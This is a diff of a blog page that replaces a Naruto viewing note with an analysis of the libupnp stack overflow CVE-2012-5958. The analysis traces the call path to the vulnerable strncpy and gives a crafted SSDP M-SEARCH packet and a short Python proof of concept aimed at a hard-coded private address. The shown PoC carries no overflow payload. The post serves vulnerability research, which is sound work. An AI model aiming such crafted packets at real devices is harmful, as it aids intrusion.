@@ -7,19 +7,17 @@
 
     
 
-    <title>火影忍者观后感 | </title><meta name="robots" content="noindex">
+    <title>libupnp.so 系列漏洞分析 | </title><meta name="robots" content="noindex">
     <meta name="author" content="ssj">
     
-    <meta name="description" content="最近开始刷火影，好香啊。
-旗木·卡卡西真的不容易。
-卡卡西给佐助用邪法封印封印天之咒印，大蛇丸突然过来，“没想到连封印之术都会用了呢，你成长了不少，卡卡西，好久不见，卡卡西。”“你不是已经得到了吗，你左眼的血轮眼，宇智波的力量。”
-我果然最喜欢卡卡西吗，佐助不香了，我今天早上在人生的道路上迷路了。
-">
+    <meta name="description" content="CVE-2012-5958 – Stack Overflow调用路径
+int main(int argc, char *argv[])
+int TvDeviceStart(char *ip_address, unsigned short port, const char *desc_doc_name">
     
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    <meta property="og:title" content="火影忍者观后感">
+    <meta property="og:title" content="libupnp.so 系列漏洞分析">
     <meta property="og:site_name" content="ssj&#39;s blog">
 
     
@@ -388,7 +386,7 @@
             
     
     
-    <a class="breadcrumb" href="/categories/杂/">杂</a><a class="breadcrumb" href="/categories/杂/火影/">火影</a>
+    <a class="breadcrumb" href="/categories/Android/">Android</a>
 
 
         
@@ -405,12 +403,12 @@
             <div class="article-title">
                 
     
-        <h1>火影忍者观后感</h1>
+        <h1>libupnp.so 系列漏洞分析</h1>
     
 
 
             </div>
-            <time class="pink-link-context" datetime="2020-05-26T11:21:26.000Z"><a href="/2020/05/26/火影忍者观后感/">2020-05-26</a></time>
+            <time class="pink-link-context" datetime="2020-06-30T15:20:52.000Z"><a href="/2020/06/30/libupnp-so-系列漏洞分析/">2020-06-30</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -420,25 +418,34 @@
             
     <div class="tags-row">
         
-            <a href="/tags/杂/" class="chip pink lighten-1">杂</a>
-        
-            <a href="/tags/火影/" class="chip pink lighten-1">火影</a>
+            <a href="/tags/Android/" class="chip pink lighten-1">Android</a>
         
     </div>
 
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#旗木·卡卡西"><span class="section table-of-contents-text">旗木·卡卡西</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#大蛇丸"><span class="section table-of-contents-text">大蛇丸</span></a></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#CVE-2012-5958-–-Stack-Overflow"><span class="section table-of-contents-text">CVE-2012-5958 – Stack Overflow</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#调用路径"><span class="section table-of-contents-text">调用路径</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#构造包"><span class="section table-of-contents-text">构造包</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#python-poc"><span class="section table-of-contents-text">python poc</span></a></li></ol></li></ol>
 </div>
 
 
             <div class="entry pink-link-context">
-                <p>最近开始刷火影，好香啊。</p>
-<h2 id="旗木·卡卡西"><a href="#旗木·卡卡西" class="headerlink" title="旗木·卡卡西"></a>旗木·卡卡西</h2><p>真的不容易。</p>
-<p>卡卡西给佐助用邪法封印封印天之咒印，大蛇丸突然过来，“没想到连封印之术都会用了呢，你成长了不少，卡卡西，好久不见，卡卡西。”“你不是已经得到了吗，你左眼的血轮眼，宇智波的力量。”</p>
-<p>我果然最喜欢卡卡西吗，佐助不香了，我今天早上在人生的道路上迷路了。</p>
-<p>“你也来了，果然卡卡西每次迟到都是来这吗，与其总是迟到不如早出发一会儿”，“不，我一大早就来了，每次来到这，就想起年少时愚蠢的自己，不能释怀。”</p>
-<h2 id="大蛇丸"><a href="#大蛇丸" class="headerlink" title="大蛇丸"></a>大蛇丸</h2><p>核心科技，大蛇丸制造，既是科学家又是哲学家，名言是关于风车那段。</p>
+                <h2 id="CVE-2012-5958-–-Stack-Overflow"><a href="#CVE-2012-5958-–-Stack-Overflow" class="headerlink" title="CVE-2012-5958 – Stack Overflow"></a>CVE-2012-5958 – Stack Overflow</h2><h3 id="调用路径"><a href="#调用路径" class="headerlink" title="调用路径"></a>调用路径</h3><ul>
+<li><code>int main(int argc, char *argv[])</code></li>
+<li><code>int TvDeviceStart(char *ip_address, unsigned short port, const char *desc_doc_name, const char *web_dir_path, print_string pfun, int combo)</code>or<code>int TvCtrlPointStart(print_string printFunctionPtr, state_update updateFunctionPtr, int combo)</code>-&gt;</li>
+<li><code>int UpnpInit(const char *HostIP, unsigned short DestPort)</code>-&gt;</li>
+<li><code>static int UpnpInitStartServers(unsigned short DestPort)</code>-&gt;</li>
+<li><code>int StartMiniServer(uint16_t *listen_port4, uint16_t *listen_port6)</code>-&gt;</li>
+<li><code>static void RunMiniServer(MiniServerSockArray *miniSock)</code>-&gt;</li>
+<li><code>static void ssdp_read(SOCKET rsock, fd_set *set)</code>-&gt;</li>
+<li><code>void readFromSSDPSocket(SOCKET socket)</code>-&gt;</li>
+<li><code>static void ssdp_event_handler_thread(void *the_data)</code>-&gt;</li>
+<li><code>void ssdp_handle_ctrlpt_msg(http_message_t *hmsg, struct sockaddr_storage *dest_addr, int timeout, void *cookie)</code>or<code>ssdp_handle_device_request(hmsg, &amp;data-&gt;dest_addr);</code>-&gt;</li>
+<li><code>int ssdp_request_type(char *cmd, SsdpEvent *Evt)</code>-&gt;</li>
+<li><code>int unique_service_name(char *cmd, SsdpEvent *Evt)</code>-&gt;</li>
+<li><code>strncpy(TempBuf, ptr1, n); // cve-2012-5958</code>.</li>
+</ul>
+<h3 id="构造包"><a href="#构造包" class="headerlink" title="构造包"></a>构造包</h3><p>M-SEARCH * HTTP/1.1<br>HOST:239.255.255.250:1900<br>MAN:”ssdp:discover”<br>MX:3<br>ST:uuid:rootdevice</p>
+<h3 id="python-poc"><a href="#python-poc" class="headerlink" title="python poc"></a>python poc</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">SSDP_ADDR = <span class="string">'172.21.192.2'</span></span><br><span class="line"><span class="comment"># SSDP_ADDR = '10.18.25.50'</span></span><br><span class="line">SSDP_PORT = <span class="number">1900</span></span><br><span class="line"></span><br><span class="line">MS = <span class="string">'''M-SEARCH * HTTP/1.1</span></span><br><span class="line"><span class="string">Host:239.255.255.250:1900</span></span><br><span class="line"><span class="string">ST:upnp:rootdevice</span></span><br><span class="line"><span class="string">Man:"ssdp:discover"</span></span><br><span class="line"><span class="string">MX:3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">__s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">__s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">local_ip = socket.gethostbyname(socket.gethostname())</span><br><span class="line">__s.bind((local_ip, <span class="number">50000</span>))</span><br><span class="line">__s.sendto(MS, (SSDP_ADDR, SSDP_PORT))</span><br></pre></td></tr></table></figure>
 <!-- flag of hidden posts -->
                 
 
